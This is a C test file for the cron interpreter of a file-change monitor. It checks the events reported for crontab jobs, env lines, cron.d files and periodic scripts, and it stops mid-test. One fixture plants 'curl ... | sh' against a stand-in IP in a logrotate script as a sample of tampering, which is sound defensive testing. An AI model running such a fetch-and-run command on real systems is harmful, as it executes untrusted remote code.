/*
 *  The cron interpreter (test/expect/system-interpreters.md SC-1 to SC-6,
 *  SW-1 to SW-6, SW-8; finding-kinds.md, cron_*). The fixtures are the
 *  files the pin's "how established" cells name: Debian's `etc/crontab`
 *  with its SHELL and PATH lines and its run-parts jobs, a spool file
 *  `crontabs/siteuser` of mode 600 with the three header lines crontab
 *  adds, `cron.d` files named `ok-name`, `UPPER_1`, `has.dot`, `tilde~`
 *  and one of mode 666, and scripts named `ok-name`, `UPPER_1`,
 *  `under_score`, `has.dot`, `tilde~` and one of mode 644.
 */
#include "sys_test.h"

#include "interp/inwords.h"

#include <sys/time.h>

#define HEAD "# /etc/crontab: system-wide crontab\n" \
             "SHELL=/bin/sh\n" \
             "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n" \
             "\n" \
             "# m h dom mon dow user\tcommand\n"
#define HOURLY  "17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n"
#define DAILY   "25 6\t* * *\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }\n"
#define WEEKLY  "47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }\n"
#define MONTHLY "52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }\n"

#define ENV2 "\"env\":[\"SHELL=/bin/sh\",\"PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\"]"

#define STATUS_CRON "Package: cron\nStatus: install ok installed\nArchitecture: amd64\nVersion: 3.0pl1-184ubuntu2\n\n"
#define STATUS_BASE "Package: base-files\nStatus: install ok installed\nArchitecture: amd64\nVersion: 13ubuntu10\n\n"
#define STATUS_GONE "Package: cron\nStatus: deinstall ok config-files\nArchitecture: amd64\nVersion: 3.0pl1-184ubuntu2\n\n"

static int count(const char *hay, const char *needle) {
    int n = 0;
    for (const char *p = hay; (p = strstr(p, needle)) != NULL; p += strlen(needle)) n++;
    return n;
}

/* SC-1: a job line of etc/crontab, its user field, its command as written,
 * the SHELL and PATH lines above it; removed before added, by line. */
TEST(crontab_jobs_added_and_removed_are_events_with_the_env_above_them) {
    t_reset();
    t_file("etc/crontab", HEAD HOURLY DAILY WEEKLY MONTHLY, 0644);
    REQUIRE(t_snap(1) == 0);
    t_file("etc/crontab", HEAD HOURLY WEEKLY MONTHLY "*/5 * * * * root /usr/local/bin/beacon --quiet 100%\n", 0644);
    REQUIRE(t_snap(2) == 0);
    ASSERT_EQ_STR(
        "{\"event\":\"cron_job_removed\",\"interp\":\"cron\",\"path\":\"etc/crontab\",\"schedule\":\"25 6 * * *\","
        "\"user\":\"root\",\"command\":\"test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }\","
        ENV2 ",\"in_words\":\"at 06:25 every day (by cron's clock)\","
        "\"text\":\"cron job removed in etc/crontab: 25 6 * * * root test -x /usr/sbin/anacron || "
        "{ cd / && run-parts --report /etc/cron.daily; }\",\"paths\":[\"etc/crontab\"]}\n"
        "{\"event\":\"cron_job_added\",\"interp\":\"cron\",\"path\":\"etc/crontab\",\"schedule\":\"*/5 * * * *\","
        "\"user\":\"root\",\"command\":\"/usr/local/bin/beacon --quiet 100%\"," ENV2
        ",\"in_words\":\"every 5 minutes (by cron's clock)\","
        "\"text\":\"cron job added in etc/crontab: */5 * * * * root /usr/local/bin/beacon --quiet 100%\","
        "\"paths\":[\"etc/crontab\"]}\n",
        t_events(1, 2));
    /* The same lines in another order are no event; nor is a comment or a
     * blank line added. */
    t_file("etc/crontab", "# moved\n\n" HEAD MONTHLY WEEKLY "*/5 * * * * root /usr/local/bin/beacon --quiet 100%\n" HOURLY, 0644);
    REQUIRE(t_snap(3) == 0);
    ASSERT_EQ_STR("", t_events(2, 3));
    /* The file removed: each of its jobs, and the two lines SHELL and PATH. */
    t_rm("etc/crontab");
    REQUIRE(t_snap(4) == 0);
    const char *ev = t_events(3, 4);
    ASSERT_EQ_INT(4, count(ev, "{\"event\":\"cron_job_removed\""));
    ASSERT_EQ_INT(2, count(ev, "{\"event\":\"cron_env_removed\""));
    ASSERT_EQ_INT(6, count(ev, "\n"));
    ASSERT_TRUE(strstr(ev, "\"name\":\"SHELL\",\"value\":\"/bin/sh\",") != NULL);
}

/* SC-1, SI-5: cron.d has the user field, a spool file's user is its name;
 * owner is the file's package, null in no package. */
TEST(cron_d_and_spool_jobs_carry_user_owner_and_words) {
    t_reset();
    t_file("var/lib/dpkg/status", STATUS_BASE STATUS_CRON, 0644);
    t_file("var/lib/dpkg/diversions", "", 0644);
    t_file("var/lib/dpkg/info/cron.list", "/etc/crontab\n", 0644);
    t_file("var/lib/dpkg/info/e2fsprogs.list", "/etc/cron.d\n/etc/cron.d/e2scrub_all\n", 0644);
    REQUIRE(t_snap(1) == 0);
    t_file("etc/cron.d/e2scrub_all",
           "30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron\n"
           "10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r\n", 0644);
    t_file("etc/cron.d/site", "MAILTO=ops@example.org\n@daily www-data /srv/site/rotate.sh\n", 0644);
    t_file("var/spool/cron/crontabs/siteuser",
           "# DO NOT EDIT THIS FILE - edit the master and reinstall.\n"
           "# (/tmp/crontab.Ab12Cd/crontab installed on Wed Nov 18 10:00:00 2026)\n"
           "# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)\n"
           "0 4 * * 1,4 /home/siteuser/backup.sh\n", 0600);
    REQUIRE(t_snap(2) == 0);
    ASSERT_EQ_STR(
        "{\"event\":\"cron_job_added\",\"interp\":\"cron\",\"path\":\"etc/cron.d/e2scrub_all\",\"schedule\":\"30 3 * * 0\","
        "\"user\":\"root\",\"command\":\"test -e /run/systemd/system || SERVICE_MODE=1 "
        "/usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron\",\"env\":[],\"owner\":\"e2fsprogs\","
        "\"in_words\":\"at 03:30 on Sun (by cron's clock)\","
        "\"text\":\"cron job added in etc/cron.d/e2scrub_all: 30 3 * * 0 root test -e /run/systemd/system || "
        "SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron\",\"paths\":[\"etc/cron.d/e2scrub_all\"]}\n"
        "{\"event\":\"cron_job_added\",\"interp\":\"cron\",\"path\":\"etc/cron.d/e2scrub_all\",\"schedule\":\"10 3 * * *\","
        "\"user\":\"root\",\"command\":\"test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r\","
        "\"env\":[],\"owner\":\"e2fsprogs\",\"in_words\":\"at 03:10 every day (by cron's clock)\","
        "\"text\":\"cron job added in etc/cron.d/e2scrub_all: 10 3 * * * root test -e /run/systemd/system || "
        "SERVICE_MODE=1 /sbin/e2scrub_all -A -r\",\"paths\":[\"etc/cron.d/e2scrub_all\"]}\n"
        "{\"event\":\"cron_env_added\",\"interp\":\"cron\",\"path\":\"etc/cron.d/site\",\"name\":\"MAILTO\","
        "\"value\":\"ops@example.org\",\"text\":\"etc/cron.d/site: MAILTO added: ops@example.org\","
        "\"paths\":[\"etc/cron.d/site\"]}\n"
        "{\"event\":\"cron_job_added\",\"interp\":\"cron\",\"path\":\"etc/cron.d/site\",\"schedule\":\"@daily\","
        "\"user\":\"www-data\",\"command\":\"/srv/site/rotate.sh\",\"env\":[\"MAILTO=ops@example.org\"],\"owner\":null,"
        "\"in_words\":\"at 00:00 every day (by cron's clock)\","
        "\"text\":\"cron job added in etc/cron.d/site: @daily www-data /srv/site/rotate.sh\",\"paths\":[\"etc/cron.d/site\"]}\n"
        "{\"event\":\"cron_job_added\",\"interp\":\"cron\",\"path\":\"var/spool/cron/crontabs/siteuser\","
        "\"schedule\":\"0 4 * * 1,4\",\"user\":\"siteuser\",\"command\":\"/home/siteuser/backup.sh\",\"env\":[],"
        "\"owner\":null,\"in_words\":\"at 04:00 on Mon, Thu (by cron's clock)\","
        "\"text\":\"cron job added in var/spool/cron/crontabs/siteuser: 0 4 * * 1,4 siteuser /home/siteuser/backup.sh\","
        "\"paths\":[\"var/spool/cron/crontabs/siteuser\"]}\n",
        t_events(1, 2));
}

/* cron_env_changed: one line of a name on each side, changed; otherwise the
 * lines added and removed, cron_env_added and cron_env_removed. A job is not reported again because the lines
 * above it changed; and a file that sets TZ or CRON_TZ gives no words. */
TEST(env_lines_are_changed_added_or_removed_and_do_not_move_jobs) {
    t_reset();
    t_file("etc/cron.d/x", "PATH=/usr/bin\nMAILTO = \"a\"\n30 2 * * * root true\n", 0644);
    t_file("etc/cron.d/y", "A=1\nA=2\n", 0644);
    REQUIRE(t_snap(1) == 0);
    t_file("etc/cron.d/x", "PATH=/usr/local/bin:/usr/bin\n30 2 * * * root true\nTZ=UTC\n15 2 * * * root false\n", 0644);
    t_file("etc/cron.d/y", "A=2\nA=3\n", 0644);
    REQUIRE(t_snap(2) == 0);
    ASSERT_EQ_STR(
        "{\"event\":\"cron_env_changed\",\"interp\":\"cron\",\"path\":\"etc/cron.d/x\",\"name\":\"PATH\","
        "\"from\":\"/usr/bin\",\"to\":\"/usr/local/bin:/usr/bin\","
        "\"text\":\"etc/cron.d/x: PATH /usr/bin -> /usr/local/bin:/usr/bin\",\"paths\":[\"etc/cron.d/x\"]}\n"
        "{\"event\":\"cron_env_removed\",\"interp\":\"cron\",\"path\":\"etc/cron.d/x\",\"name\":\"MAILTO\","
        "\"value\":\"\\\"a\\\"\",\"text\":\"etc/cron.d/x: MAILTO removed: \\\"a\\\"\",\"paths\":[\"etc/cron.d/x\"]}\n"
        "{\"event\":\"cron_env_added\",\"interp\":\"cron\",\"path\":\"etc/cron.d/x\",\"name\":\"TZ\","
        "\"value\":\"UTC\",\"text\":\"etc/cron.d/x: TZ added: UTC\",\"paths\":[\"etc/cron.d/x\"]}\n"
        "{\"event\":\"cron_job_added\",\"interp\":\"cron\",\"path\":\"etc/cron.d/x\",\"schedule\":\"15 2 * * *\","
        "\"user\":\"root\",\"command\":\"false\",\"env\":[\"PATH=/usr/local/bin:/usr/bin\"],"
        "\"text\":\"cron job added in etc/cron.d/x: 15 2 * * * root false\",\"paths\":[\"etc/cron.d/x\"]}\n"
        "{\"event\":\"cron_env_removed\",\"interp\":\"cron\",\"path\":\"etc/cron.d/y\",\"name\":\"A\","
        "\"value\":\"1\",\"text\":\"etc/cron.d/y: A removed: 1\",\"paths\":[\"etc/cron.d/y\"]}\n"
        "{\"event\":\"cron_env_added\",\"interp\":\"cron\",\"path\":\"etc/cron.d/y\",\"name\":\"A\","
        "\"value\":\"3\",\"text\":\"etc/cron.d/y: A added: 3\",\"paths\":[\"etc/cron.d/y\"]}\n",
        t_events(1, 2));
    /* env: the last of each name above the job, in the file's order. */
    t_file("etc/cron.d/x", "MAILTO=a\nSHELL=/bin/sh\nOTHER=1\nMAILTO=b\nCRON_TZ=UTC\n  PATH = /bin \n5 5 * * * root x\n"
                           "SHELL=/bin/bash\n", 0644);
    REQUIRE(t_snap(3) == 0);
    ASSERT_TRUE(strstr(t_events(2, 3), "\"command\":\"x\",\"env\":[\"SHELL=/bin/sh\",\"MAILTO=b\",\"CRON_TZ=UTC\","
                                       "\"PATH = /bin\"],\"text\":") != NULL);
}

#define JOB "* * * * * root true\n"
#define JOBEV(p) "{\"event\":\"cron_job_added\",\"interp\":\"cron\",\"path\":\"" p "\",\"schedule\":\"* * * * *\"," \
                 "\"user\":\"root\",\"command\":\"true\",\"env\":[],\"owner\":null," \
                 "\"text\":\"cron job added in " p ": * * * * * root true\",\"paths\":[\"" p "\"]}\n"
#define NOTRUN(p, why) "{\"event\":\"cron_file_not_run\",\"interp\":\"cron\",\"path\":\"" p "\",\"why\":\"" why "\"," \
                       "\"text\":\"" p ": cron does not run a file like this (" why ")\",\"paths\":[\"" p "\"]}\n"
#define SCRIPT(p) "{\"event\":\"cron_script_added\",\"interp\":\"cron\",\"path\":\"" p "\",\"owner\":null," \
                  "\"text\":\"" p " added\",\"paths\":[\"" p "\"]}\n"

static void not_run_tree(void) {
    t_file("etc/cron.d/ok-name", JOB, 0644);
    t_file("etc/cron.d/UPPER_1", JOB, 0644);
    t_file("etc/cron.d/has.dot", JOB, 0644);
    t_file("etc/cron.d/tilde~", JOB, 0644);
    t_file("etc/cron.d/mode666", JOB, 0666);
    t_file("etc/cron.daily/ok-name", "#!/bin/sh\ntrue\n", 0755);
    t_file("etc/cron.daily/UPPER_1", "#!/bin/sh\ntrue\n", 0755);
    t_file("etc/cron.daily/under_score", "#!/bin/sh\ntrue\n", 0755);
    t_file("etc/cron.daily/has.dot", "#!/bin/sh\ntrue\n", 0755);
    t_file("etc/cron.daily/tilde~", "#!/bin/sh\ntrue\n", 0755);
    t_file("etc/cron.daily/plain644", "#!/bin/sh\ntrue\n", 0644);
}

/* SC-2, SC-3, SC-4: with the package cron installed by the same capture's
 * dpkg database, the names cron does not run and the modes it refuses. */
TEST(files_cron_does_not_run_are_said_where_cron_is_installed) {
    t_reset();
    t_file("var/lib/dpkg/status", STATUS_BASE STATUS_CRON, 0644);
    t_dir("var/lib/dpkg/info");
    REQUIRE(t_snap(1) == 0);
    not_run_tree();
    REQUIRE(t_snap(2) == 0);
    ASSERT_EQ_STR(
        JOBEV("etc/cron.d/UPPER_1")
        NOTRUN("etc/cron.d/has.dot", "name") JOBEV("etc/cron.d/has.dot")
        NOTRUN("etc/cron.d/mode666", "mode") JOBEV("etc/cron.d/mode666")
        JOBEV("etc/cron.d/ok-name")
        NOTRUN("etc/cron.d/tilde~", "name") JOBEV("etc/cron.d/tilde~")
        SCRIPT("etc/cron.daily/UPPER_1")
        SCRIPT("etc/cron.daily/has.dot") NOTRUN("etc/cron.daily/has.dot", "name")
        SCRIPT("etc/cron.daily/ok-name")
        SCRIPT("etc/cron.daily/plain644") NOTRUN("etc/cron.daily/plain644", "not executable")
        SCRIPT("etc/cron.daily/tilde~") NOTRUN("etc/cron.daily/tilde~", "name")
        SCRIPT("etc/cron.daily/under_score"),
        t_events(1, 2));
    /* A mode that became writable by the group, the content the same. */
    char p[700];
    snprintf(p, sizeof p, "%s/root/etc/cron.d/ok-name", g_dir);
    REQUIRE(chmod(p, 0664) == 0);
    REQUIRE(t_snap(3) == 0);
    ASSERT_EQ_STR(NOTRUN("etc/cron.d/ok-name", "mode"), t_events(2, 3));
    /* Only its times changed: the file is not one "added or changed", and
     * its name is not said again. */
    snprintf(p, sizeof p, "%s/root/etc/cron.d/has.dot", g_dir);
    const struct timeval tv[2] = { { 1000000000, 0 }, { 1000000000, 0 } };
    REQUIRE(utimes(p, tv) == 0);
    REQUIRE(t_snap(4) == 0);
    ASSERT_TRUE(strstr(t_record(t_diff(3, 4), "etc/cron.d/has.dot"), "\"outcome\":\"metadata_only\"") != NULL);
    ASSERT_EQ_STR("", t_only_events(g_text));
}

/* SC-2, SC-6: without the package (removed, never there, or no database)
 * the jobs and scripts are listed and nothing is said of validity. */
TEST(nothing_is_said_of_validity_where_cron_is_not_installed) {
    static const char *const STATUS[] = { STATUS_BASE STATUS_GONE, STATUS_BASE, NULL,
                                          "Package: cron\nStatus: install ok installed\n continuation\n",
                                          /* cron's stanza whole, the file not: a status that does not parse says nothing */
                                          STATUS_CRON "Package: x\nthis is no field\n" };
    for (size_t i = 0; i < sizeof STATUS / sizeof STATUS[0]; i++) {
        t_reset();
        if (STATUS[i] != NULL) t_file("var/lib/dpkg/status", STATUS[i], 0644);
        REQUIRE(t_snap(1) == 0);
        not_run_tree();
        REQUIRE(t_snap(2) == 0);
        const char *ev = t_events(1, 2);
        ASSERT_EQ_INT(0, count(ev, "cron_file_not_run"));
        ASSERT_EQ_INT(5, count(ev, "{\"event\":\"cron_job_added\""));
        ASSERT_EQ_INT(6, count(ev, "{\"event\":\"cron_script_added\""));
    }
}

/* cron_script_*: a file of the four directories, never read; changed is its
 * content or its mode; a link is a script, a directory is not; SC-5: no
 * schedule is claimed. */
TEST(scripts_of_the_four_directories_are_named_never_read) {
    t_reset();
    t_file("var/lib/dpkg/status", STATUS_CRON, 0644);
    t_file("var/lib/dpkg/info/logrotate.list", "/etc/cron.daily/logrotate\n", 0644);
    t_file("etc/cron.daily/logrotate", "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n", 0755);
    t_file("etc/cron.weekly/gone", "#!/bin/sh\n", 0755);
    t_file("etc/cron.monthly/chmodded", "#!/bin/sh\n", 0755);
    t_file("etc/cron.hourly/same", "30 2 * * * root not-a-crontab\n", 0755);
    REQUIRE(t_snap(1) == 0);
    t_file("etc/cron.daily/logrotate", "#!/bin/sh\ncurl -s http://198.51.100.7/x | sh\n", 0755);
    t_rm("etc/cron.weekly/gone");
    char p[700];
    snprintf(p, sizeof p, "%s/root/etc/cron.monthly/chmodded", g_dir);
    REQUIRE(chmod(p, 0644) == 0);
    t_link("etc/cron.hourly/link", "/usr/local/bin/tool");
    t_file("etc/cron.hourly/sub/deeper", "x\n", 0755);
    REQUIRE(t_snap(2) == 0);
    ASSERT_EQ_STR(
        "{\"event\":\"cron_script_changed\",\"interp\":\"cron\",\"path\":\"etc/cron.daily/logrotate\",\"owner\":\"logrotate\","
        "\"text\":\"etc/cron.daily/logrotate changed\",\"paths\":[\"etc/cron.daily/logrotate\"]}\n"
        "{\"event\":\"cron_script_added\",\"interp\":\"cron\",\"path\":\"etc/cron.hourly/link\",\"owner\":null,"
        "\"text\":\"etc/cron.hourly/link added\",\"paths\":[\"etc/cron.hourly/link\"]}\n"
        "{\"event\":\"cron_script_changed\",\"interp\":\"cron\",\"path\":\"etc/cron.monthly/chmodded\",\"owner\":null,"
        "\"text\":\"etc/cron.monthly/chmodded changed\",\"paths\":[\"etc/cron.monthly/chmodded\"]}\n"
        NOTRUN("etc/cron.monthly/chmodded", "not executable")
        "{\"event\":\"cron_script_removed\",\"interp\":\"cron\",\"path\":\"etc/cron.weekly/gone\",\"owner\":null,"
        "\"text\":\"etc/cron.weekly/gone removed\",\"paths\":[\"etc/cron.weekly/gone\"]}\n",
        t_events(1, 2));
}

/* SI-2: a line that is neither a comment, an env line nor a whole job makes
 * its file could_not_interpret: an event naming it, its record saying so and
 * standing; the other files' events stand. */
TEST(a_crontab_that_does_not_parse_is_could_not_interpret_and_its_record_stands) {
    t_reset();
    t_file("etc/cron.d/ok", JOB, 0644);
    REQUIRE(t_snap(1) == 0);
    t_file("etc/cron.d/bad", JOB "* * * * root\n", 0644);
    t_file("etc/cron.d/ok", JOB "@reboot root /usr/local/bin/up\n", 0644);
    t_file("var/spool/cron/crontabs/u", "0 0 * * *\n", 0600);
    REQUIRE(t_snap(2) == 0);
    const char *d = t_diff(1, 2);
    ASSERT_TRUE(strstr(t_record(d, "etc/cron.d/bad"), "\"outcome\":\"added\"") != NULL);
    ASSERT_TRUE(strstr(t_record(d, "etc/cron.d/bad"),
                       ",\"findings\":[{\"kind\":\"could_not_interpret\",\"text\":\"could not interpret\"}]") != NULL);
    ASSERT_EQ_STR(
        "{\"event\":\"could_not_interpret\",\"interp\":\"cron\",\"text\":\"could not interpret\",\"paths\":[\"etc/cron.d/bad\"]}\n"
        "{\"event\":\"cron_job_added\",\"interp\":\"cron\",\"path\":\"etc/cron.d/ok\",\"schedule\":\"@reboot\","
        "\"user\":\"root\",\"command\":\"/usr/local/bin/up\",\"env\":[],\"in_words\":\"at startup (by cron's clock)\","
        "\"text\":\"cron job added in etc/cron.d/ok: @reboot root /usr/local/bin/up\",\"paths\":[\"etc/cron.d/ok\"]}\n"
        "{\"event\":\"could_not_interpret\",\"interp\":\"cron\",\"text\":\"could not interpret\","
        "\"paths\":[\"var/spool/cron/crontabs/u\"]}\n",
        t_only_events(g_text));
}

#define E10(p) "{\"event\":\"could_not_interpret\",\"interp\":\"cron\",\"text\":\"could not interpret\",\"paths\":[\"" p "\"]}\n"
#define CNI ",\"findings\":[{\"kind\":\"could_not_interpret\",\"text\":\"could not interpret\"}]"

/* SI-2, by hand: what no capture of this binary writes -- a claimed file
 * sealed or not read, one with no copy, one whose copy is gone -- is never
 * silent; an unknown outcome is read, its events provisional, its record
 * given no finding; what is not a file of cron's is declined. */
TEST(what_cannot_be_read_is_said_and_what_is_not_crons_is_declined) {
    struct t_run r;
    tr_begin(&r, BELAY_INTERP_CRON);
    struct belay_entry a = t_entry("etc/cron.d/sealed", BELAY_T_REG, 0600, NULL);
    a.sealed = true;
    ASSERT_EQ_STR(CNI, tr_path(&r, "etc/cron.d/sealed", NULL, &a, "added"));
    struct belay_entry m = t_entry("etc/crontab", BELAY_T_REG, 0644, NULL);
    m.meta = true;
    ASSERT_EQ_STR(CNI, tr_path(&r, "etc/crontab", NULL, &m, "added"));
    const struct belay_entry nc = t_entry("etc/cron.d/nocopy", BELAY_T_REG, 0644, NULL);
    ASSERT_EQ_STR(CNI, tr_path(&r, "etc/cron.d/nocopy", &nc, NULL, "removed"));
    const struct belay_entry gone = t_entry("etc/cron.d/gone", BELAY_T_REG, 0644,
                                            "0000000000000000000000000000000000000000000000000000000000000000");
    const struct belay_entry ok = t_entry("etc/cron.d/gone", BELAY_T_REG, 0644, t_put(JOB));
    ASSERT_EQ_STR(CNI, tr_path(&r, "etc/cron.d/gone", &gone, &ok, "modified"));
    const struct belay_entry lnk = t_entry("etc/cron.d/link", BELAY_T_LNK, 0777, NULL);
    ASSERT_EQ_STR(CNI, tr_path(&r, "etc/cron.d/link", NULL, &lnk, "added"));
    /* unknown: no finding, the event provisional -- also when it cannot be read */
    const struct belay_entry u1 = t_entry("etc/cron.d/raced", BELAY_T_REG, 0644, t_put(JOB));
    ASSERT_EQ_STR("", tr_path(&r, "etc/cron.d/raced", NULL, &u1, "unknown"));
    ASSERT_EQ_STR("", tr_path(&r, "etc/cron.d/raced2", NULL, &nc, "unknown"));
    /* declined: deeper than the directory, a directory, a content-equal file, a near name */
    const struct belay_entry deep = t_entry("etc/cron.d/sub/x", BELAY_T_REG, 0644, t_put("not a crontab\n"));
    ASSERT_EQ_STR("", tr_path(&r, "etc/cron.d/sub/x", NULL, &deep, "added"));
    ASSERT_EQ_INT(BELAY_INTERP_DECLINE, (int)r.last);
    const struct belay_entry dir = t_entry("etc/cron.d/sub", BELAY_T_DIR, 0755, NULL);
    ASSERT_EQ_STR("", tr_path(&r, "etc/cron.d/sub", NULL, &dir, "added"));
    ASSERT_EQ_INT(BELAY_INTERP_DECLINE, (int)r.last);
    const struct belay_entry same = t_entry("etc/crontab2", BELAY_T_REG, 0644, t_put("junk\n"));
    ASSERT_EQ_STR("", tr_path(&r, "var/spool/cron/crontabs/a/b", NULL, &same, "added"));
    ASSERT_EQ_STR("", tr_path(&r, "etc/cron.daily/d/x", NULL, &same, "added"));
    const struct belay_entry eq = t_entry("etc/cron.d/eq", BELAY_T_REG, 0644, t_put("junk that is not parsed\n"));
    ASSERT_EQ_STR("", tr_path(&r, "etc/cron.d/eq", &eq, &eq, "metadata_only"));
    ASSERT_EQ_STR(
        E10("etc/cron.d/gone") E10("etc/cron.d/link") E10("etc/cron.d/nocopy")
        "{\"event\":\"cron_job_added\",\"interp\":\"cron\",\"path\":\"etc/cron.d/raced\",\"schedule\":\"* * * * *\","
        "\"user\":\"root\",\"command\":\"true\",\"env\":[],\"text\":\"cron job added in etc/cron.d/raced: * * * * * root true\","
        "\"provisional\":true,\"paths\":[\"etc/cron.d/raced\"]}\n"
        "{\"event\":\"could_not_interpret\",\"interp\":\"cron\",\"text\":\"could not interpret\",\"provisional\":true,"
        "\"paths\":[\"etc/cron.d/raced2\"]}\n"
        E10("etc/cron.d/sealed") E10("etc/crontab"),
        tr_end(&r, NULL, 0));
    tr_free(&r);
}

/* SW-1 to SW-6 and SW-8: every form of the table, and what has no words. */
TEST(in_words_is_given_for_the_forms_of_the_table_only) {
    static const struct { const char *s, *w; } T[] = {
        { "*/5 * * * *", "every 5 minutes" },                         /* SW-1 */
        { "*/15 * * * *", "every 15 minutes" },
        { "*/1 * * * *", "every 1 minutes" },
        { "0 */2 * * *", "at minute 0 of every 2nd hour" },           /* SW-2 */
        { "17 */3 * * *", "at minute 17 of every 3rd hour" },
        { "5 */4 * * *", "at minute 5 of every 4th hour" },
        { "5 */12 * * *", "at minute 5 of every 12th hour" },
        { "5 */1 * * *", "at minute 5 of every 1st hour" },
        { "25 6 * * *", "at 06:25 every day" },                       /* SW-3 */
        { "0 0 * * *", "at 00:00 every day" },
        { "59 23 * * *", "at 23:59 every day" },
        { "05 03 * * *", "at 03:05 every day" },
        { "47 6 * * 7", "at 06:47 on Sun" },                          /* SW-4 */
        { "47 6 * * 0", "at 06:47 on Sun" },
        { "0 4 * * 1,4", "at 04:00 on Mon, Thu" },
        { "0 4 * * mon,THU", "at 04:00 on Mon, Thu" },
        { "0 4 * * Sat,2,wed,5,6", "at 04:00 on Sat, Tue, Wed, Fri, Sat" },
        { "52 6 1 * *", "at 06:52 on day 1 of every month" },         /* SW-5 */
        { "0 12 31 * *", "at 12:00 on day 31 of every month" },
        { "@hourly", "at minute 0 of every hour" },                   /* SW-6 */
        { "@daily", "at 00:00 every day" },
        { "@midnight", "at 00:00 every day" },
        { "@weekly", "at 00:00 on Sun" },
        { "@monthly", "at 00:00 on day 1 of every month" },
        { "@yearly", "at 00:00 on day 1 of month 1" },
        { "@annually", "at 00:00 on day 1 of month 1" },
        { "@reboot", "at startup" },
    };
    for (size_t i = 0; i < sizeof T / sizeof T[0]; i++) {
        char out[128] = "", want[128];
        snprintf(want, sizeof want, "%s (by cron's clock)", T[i].w);
        if (!inwords_cron(T[i].s, strlen(T[i].s), out, sizeof out)) BELAY_FAIL("%s: no words", T[i].s);
        else if (strcmp(want, out) != 0) BELAY_FAIL("%s: want \"%s\", got \"%s\"", T[i].s, want, out);
    }
    /* SW-8: a range, a step with a start, another list, a number out of its
     * range, a step that does not divide its field, and every other form. */
    static const char *const NONE[] = {
        "* * * * *", "17 * * * *", "0-30/5 * * * *", "5/15 * * * *", "*/5 */2 * * *", "*/0 * * * *", "*/7 * * * *",
        "*/60 * * * *", "*/5 * * * 1", "*/5 * 1 * *", "*/5 * * 6 *", "0 */5 * * *", "0 */0 * * *", "0 */24 * * *",
        "* */2 * * *", "0,30 */2 * * *", "0 */2 * * 1", "0 */2 1 * *", "60 6 * * *", "25 24 * * *", "1-5 6 * * *",
        "25 6-8 * * *", "25 6,7 * * *", "25 6 * 1 *", "25 6 * jan *", "25 6 * * 8", "25 6 * * 1-5", "25 6 * * mon-fri",
        "25 6 * * */2", "25 6 * * 1,", "25 6 * * ,1", "25 6 * * monday", "25 6 * * mo", "25 6 * * *,1", "25 6 1 * 1",
        "25 6 0 * *", "25 6 32 * *", "25 6 1,15 * *", "25 6 1-5 * *", "25 6 */2 * *", "25 6 L * *", "25 6 ? * *",
        "-1 6 * * *", "+5 6 * * *", "025 6 * * *", "2 5 6 * * *", "25 6 * *", "", "@Daily", "@every 5m", "@", "daily",
        "25  6 * * *", " 25 6 * * *", "25 6 * * * ", "a b c d e",
    };
    for (size_t i = 0; i < sizeof NONE / sizeof NONE[0]; i++) {
        char out[128] = "";
        if (inwords_cron(NONE[i], strlen(NONE[i]), out, sizeof out)) BELAY_FAIL("\"%s\": words \"%s\"", NONE[i], out);
    }
    /* What does not fit is no words, never cut ones. */
    char small[16];
    ASSERT_FALSE(inwords_cron("25 6 * * *", 10, small, sizeof small));
    ASSERT_FALSE(inwords_cron("@reboot", 7, small, 5));
}

/* SW-8 in a file: CRON_TZ or TZ anywhere in it, and no job of it has words;
 * a form outside the table has none either, and the event stands. */
TEST(in_words_is_absent_in_a_file_that_sets_a_time_zone) {
    static const char *const TZ[] = { "CRON_TZ=Europe/Helsinki\n25 6 * * * root a\n", "25 6 * * * root a\nTZ=UTC\n",
                                      "25 6 * * 1-5 root a\n" };
    for (size_t i = 0; i < 3; i++) {
        t_reset();
        REQUIRE(t_snap(1) == 0);
        t_file("etc/cron.d/tz", TZ[i], 0644);
        REQUIRE(t_snap(2) == 0);
        const char *ev = t_events(1, 2);
        ASSERT_EQ_INT(1, count(ev, "{\"event\":\"cron_job_added\""));
        ASSERT_EQ_INT(0, count(ev, "in_words"));
    }
    t_reset();
    REQUIRE(t_snap(1) == 0);
    t_file("etc/cron.d/tz", "25 6 * * * root a\nTZX=1\n", 0644);
    REQUIRE(t_snap(2) == 0);
    ASSERT_EQ_INT(1, count(t_events(1, 2), "\"in_words\":\"at 06:25 every day (by cron's clock)\""));
}

static struct belay_entry g_e;
static const char *one(struct t_run *r, const char *path, const char *data, size_t n) {
    tr_begin(r, BELAY_INTERP_CRON);
    g_e = t_entry(path, BELAY_T_REG, 0644, t_put_n(data, n));
    tr_path(r, path, NULL, &g_e, "added");
    return tr_end(r, NULL, 0);
}

/* The files are written by the watched machine: NUL bytes, a very long
 * line, no final newline, CRLF, bytes that are not UTF-8, 100,000 lines. */
TEST(hostile_crontabs_are_read_or_refused_never_trusted) {
    struct t_run r;
    ASSERT_EQ_STR(E10("etc/cron.d/x"), one(&r, "etc/cron.d/x", "* * * * * root a\0b\n", 19));
    tr_free(&r);
    /* 70,000 bytes of command: the event breaks its row (a string field is
     * 1,024 bytes), and is said as invalid (E9), the next line's standing. */
    static char big[80000];
    size_t w = (size_t)snprintf(big, sizeof big, "* * * * * root ");
    memset(big + w, 'x', 70000);
    w += 70000;
    w += (size_t)snprintf(big + w, sizeof big - w, "\n@reboot root after");
    ASSERT_EQ_STR(
